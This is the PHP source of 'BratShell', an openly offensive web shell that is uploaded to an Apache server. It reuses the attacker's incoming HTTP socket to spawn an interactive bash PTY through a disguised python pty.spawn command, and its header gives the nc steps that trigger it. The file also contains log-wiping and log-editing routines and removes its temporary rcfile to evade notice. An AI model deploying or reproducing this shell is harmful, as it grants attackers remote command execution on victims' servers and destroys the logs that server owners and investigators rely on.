<?php

/**
 *    BratShell, findsock php stateful pty shell.
 *    Author: Brian Heese
 *    Contributors: Jeroen van Rijn, Richard Clifford, Marlon Etheredge
 *    Date: 05-08-2013
 *    Dependencies: PHP >= 5.3.6 - 5.3.14, PHP >= 5.4.0 - 5.4.4
 *                  
 *    USAGE: 
 *      1: Upload to Apache server running PHP >= 5.3.6 and PHP >= 5.4.0 - 5.4.4
 *      2: nc -v [target hostname] 80
 *          GET /fd.php HTTP/1.0
 *
 *      [shell magically spawns]
 *      $SINIT (<-- optional in case you want a pretty shell)
 *
 */

// Kill xdebug if available
if(function_exists('xdebug_disable')) { xdebug_disable(); }

// Disable timing out as we wish to facilitate a stateful shell session.
set_time_limit(0);

// TODO: Set debug info to false when releasing to production.
ini_set('error_reporting', E_ALL);
ini_set('display_errors', true);

class BratShell 
{
    private $m_Shell = '/bin/bash';

    private $m_Pid,
            $m_Nice,
            $m_FileDescriptors,
            $m_BossIp,
            $m_BossPort,
            $m_BossSock,
            $m_TimeStart,
            $m_TimeEnd;

    public function __construct() 
    {
        $this->m_Pid             = getmypid();
        $this->m_Nice            = $this->getProcessNice();
        $this->m_FileDescriptors = array();
        $this->m_TimeStart       = time();

        // Boss details
        $this->m_BossIp          = $_SERVER['REMOTE_ADDR'];
        $this->m_BossPort        = $_SERVER['REMOTE_PORT'];
    }

    /**
     *    Fetch current process priority
     *    0 is highest, thus the higher the number
     *    the lower the priority of the process.
     */
    private function getProcessNice ($pid = null) 
    {
        if (!$pid) 
        {
            $pid = $this->m_Pid;
        }

        $res = `ps -p $pid -o "%p %n"`;

        // Fetch info we want from output
        preg_match ('/^\s*\w+\s+\w+\s*(\d+)\s+(\d+)/m', $res, $matches);

        // Return Pid and priority
        return array (
            'pid' => (isset ($matches[1]) ? $matches[1] : null),
            'nice' => (isset ($matches[2]) ? $matches[2] : null),
        );
    }

    /**
     *    Method which enumerates all inherited file descriptors
     *    and looks up all relevant info for each.
     */
    private function getFileDescriptors() 
    {
        $it = new DirectoryIterator("glob:///proc/self/fd/*");
       
        switch(true) {
        case stristr(PHP_OS, 'DAR'):
            $pid    = $this->m_Pid;
            $x      = `lsof -p $pid`;
            $r      = preg_split('/\s+/', $x);
            
            if ($r) 
            {
                $n  = 0;
                $c  = count($r);
                $a  = $d = array();
                
                for ($i = 0 ; $i < 9 ; ++$i) 
                {
                    $a[] = $r[$n++];
                }

                while($n < $c) 
                {
                    $t = array();
                    for ($i = 0 ; $i < 9 ; ++$i) 
                    {
                        $t[$a[$i]] = @$r[$n++];
                    }
                    $d[] = $t;
                }

                $c  = count($d);
                for ($i = 0 ; $i < $c ; ++$i) 
                {
                    list($fd, $mode, $type) = sscanf($d[$i]['FD'], '%d%c%c');
                    
                    if ($fd) 
                    {
                        $t = array();
                        $t['fd'] = $fd = fopen('php://fd/' . $fd, $mode);
                        
                        if ($fd) 
                        {
                            $details        = stream_get_meta_data($fd);
                            $t['type']      = $details['stream_type'];
                            $t['state']     = $details['blocked'];
                            $t['uri']       = $details['uri'];
                            $t['mode']      = $details['mode'];
                            $t['filepath']  = $d[$i]['NAME'];
                            $this->m_FileDescriptors[$fd] = $t;
                        } 
                        else 
                        {
                            echo 'Fuck...' . "\n";
                        }
                    }
                }
            } 
            else 
            {
                die('Fuck me');
            }
            break;
        default:
            foreach($it as $f) 
            {
                $tmpArr = array();

                // Create resource from fd
                $tmpArr['fd']       = $fd = fopen("php://fd/" . $f->getFilename(), 'r+');

                // Determine type
                $details            = stream_get_meta_data($fd);
                $tmpArr['type']     = $details['stream_type'];

                // Determine Blocked / Non-Blocked state
                $tmpArr['state']    = $details['blocked'];

                // Determine uri
                $tmpArr['uri']      = $details['uri'];

                // Fd mode
                $tmpArr['mode']     = $details['mode'];

                // retrieve filepath
                $tmpArr['filepath'] = readlink('/proc/self/fd/' . $f->getFilename());

                // Save
                $this->m_FileDescriptors[ $f->getFilename() ] = $tmpArr;
            }
        }
    }

    /**
     *  Print fd details, debugging util
     */
    public function printFileDescriptors() 
    {
        if(!$this->m_FileDescriptors)
        {
            $this->getFileDescriptors();
        }
        foreach ( $this->m_FileDescriptors as $id => $fd ) 
        {
            echo 'FD #' . $id . ': ' . print_r( $fd, true ) . '<br />';
        }
        echo "<hr/>".print_r($this->m_FileDescriptors, true).'<br/>';
    }

    /**
     *  Method that erases contents of a log file we have inherited a file descriptor too
     */
    public function wipeLog( $fd = null ) 
    {
        // Default fd for log. If NULL ,retrieve logfiles from internal file descripters.
        if( $fd == null )
        {
            $logfiles = $this->getLogFiles();
        } 
        else 
        {
            $logfiles[] = $fd;
        }

        foreach($logfiles as $key => $props)
        {
            if(!is_resource($props['fd'])) 
            {
                continue;
            }

            // Fetch log size before whiping so we can check if the operation is successfull later on
            $prevSize = strlen( stream_get_contents($props['fd']) );

            if($prevSize !== false)
            {
                // Truncate filesize to 0 and close resource
                if(ftruncate($props['fd'] , 0))
                {

                    // Fetch current size of data
                    $currentSize = strlen( stream_get_contents($props['fd']) );

                    // Check if current size is smaller then prev size to know the operation was succesfull
                    if($currentSize < $prevSize || $currentSize == false) {
                        echo 'Log is empty: ' . $props['filepath'] . '!<br/>';
                    } else {
                        echo 'Log whipe failed, uh ooh..';
                    }
                }
            }

            fclose($props['fd']);
        }
    }

    /**
     *  Search for inherited file descriptors to log files
     */
    private function getLogFiles()
    {

        if(empty($this->m_FileDescriptors))
        {

            $this->getFileDescriptors();
        }

        foreach($this->m_FileDescriptors as $fd => $props)
        {

            if(preg_match('/((\w)+(\.log))/', $props['filepath']))
            {
                $logfiles[$fd] = $props;
            }
        }

        return $logfiles;
    }


    /**
     *    Method that reads contents of log file referenced by fd
     *    performs some basic manipulations on the data and
     *    overwrites the log with manipulated version.
     *
     *    @todo : Finish this
     */
    private function editLog( $fd = null ) 
    {
        $this->m_TimeEnd = time();
        $timeStart = date('M  d', $this->m_TimeStart);

        $logFileName = ''; // Filename?
       
        $fh = @fopen($logFileName, 'r+');
       
        if(!$fh){
            return false;
        }
        $logResult = '';
        while(($line = fgets($fh)) !== false)
        {
            if(feof($fh))
            {
                return false;
            }
            if(preg_match('/^([A-Za-z]{1,3}(\s|\t)+[0-9]{1,2}(\t|\s)+[0-9\:]{0,3}+)(.?*)$/', $line, $matches))
            {
                $dateTime = $matches[1];

                // Added in the strtolower just for extra checks - Want to be safe if we are editing logs
                if(strtolower($dateTime) == strtolower( substr($line, 0, (strlen($dateTime)-1)) ))
                {
                    $line = '';
                }
            }
            $logResult .= $line;
        }
        @fwrite($fh, $logResult);
        @fclose($fh);
        return;
    }

    /**
     *    Iterate over inherited socket descriptors
     *    until the requesting socket is found.
     */
    public function findSock() 
    {
        if(!$this->m_FileDescriptors)
        {
            $this->getFileDescriptors();
        }
        if(!empty($this->m_FileDescriptors))
        {
            foreach( $this->m_FileDescriptors as $id => $d ) 
            {
                // Skip if fd is not a socket
                if( $d['type'] != 'tcp_socket' )
                {
                    continue;
                }

                $remote = stream_socket_get_name($d['fd'], true);
                if( strstr($remote, $this->m_BossIp . ':' . $this->m_BossPort) ) 
                {
                    // Sock found!
                    $this->m_BossSock = $d['fd'];

                    if( is_resource($this->m_BossSock) )
                        echo 'Found socket!\n';
                    else
                        die('weird...');
                    return;
                }
            }
        }
    }

    /**
     *  Awesome banner ASCII art
     */
    public function getBanner() 
    {
        return '
     ____             __  _____ __         ____         ____   ___   ___    __      __         
   / __ )_________ _/ /_/ ___// /_  ___  / / /  _   __/ __ \ <  /  /   |  / /___  / /_  ____ _
  / __  / ___/ __ `/ __/\__ \/ __ \/ _ \/ / /  | | / / / / / / /  / /| | / / __ \/ __ \/ __ `/
 / /_/ / /  / /_/ / /_ ___/ / / / /  __/ / /   | |/ / /_/ / / /  / ___ |/ / /_/ / / / / /_/ / 
/_____/_/   \__,_/\__//____/_/ /_/\___/_/_/    |___/\____(_)_/  /_/  |_/_/ .___/_/ /_/\__,_/  
                                                                        /_/                   
            >>>> Run $SINIT to enable bash color output

    ';
    }

    /**
     *  Main method to set up and bind the shell
     */
    public function hookShell($sock = null) 
    {
        // Check if sock has been found
        if( !is_resource($this->m_BossSock) )
        {
            echo 'BossSock is not resource, looking for socket.';
            $this->findSock();
        }

        $sock = $this->m_BossSock;

        // Disable blocking for socket stream
        socket_set_nonblock($sock);

        // Prepare io pipes
        $io = array(
                0 => $sock,
                1 => $sock,
                2 => $sock
            );

        // Write temporary rcfile
        $tmpfile = tmpfile();
        fwrite($tmpfile, 'eval $COLLECTD');
        $meta_data = stream_get_meta_data($tmpfile);
        $rcfile = $meta_data["uri"];

        // Prepare env. variables
        $env = array(   'PS1'           =>'\[\033[36m\]\u\[\033[m\]@\[\033[32m\]\h:\[\033[33;1m\]\w\[\033[m\]$', 
                        'TERM'          =>'xterm-color',
                        'GREP_OPTIONS'  =>'--color=auto',
                        'GREP_COLOR'    =>'1;32',
                        'CLICOLOR'      =>'1',
                        'LSCOLORS'      =>'ExFxCxDxBxegedabagacad',

                        // Spawn pty shell using python giving us more capabilities (ie. su, less, etc.) 
                        // TODO: Check if python is installed
                        'COLLECTD'      =>"python -c 'import pty; pty.spawn(\"/bin/bash\")'",           
                        'SINIT'         =>'source /etc/skel/.bashrc && source /etc/skel/.profile',
                    );

        // Set process as leading session.
        posix_setsid();

        // Write Banner to socket before spawning shell
        fwrite($sock, $this->getBanner());

        // Spawn shell process and attach pipes
        // TODO: place bash args in $this->m_Shell with placeholder for rcfile. 
        $proc = proc_open(  $this->m_Shell . ' --rcfile ' . $rcfile . ' -i',
                            $io,
                            $pipes,
                            NULL,
                            $env
                        );

        // Check if process spawned successfully
        if( !is_resource($proc) )
            die('Failed to spawn shell process');

        // Wait for one second and remove temporary rcfile to avoid attention
        sleep(1);
        fclose($tmpfile);

        // Main loop
        while( is_resource($sock) ) 
        {
            // Fetch proc and sock states
            $procState = proc_get_status($proc);

            // Check if either one is dead
            if( $procState['running'] === false  ) 
            {
                break;
            }

            // Put PHP to sleep, shell is now piped directly to socket and 
            // we only need to prevent php from exit to keep shell alive.
            sleep(1000);
        }

        // Clean up
        fflush($sock);
        fclose($sock);
        proc_close($proc);
    }
}

$bs = new BratShell();
$bs->hookShell();
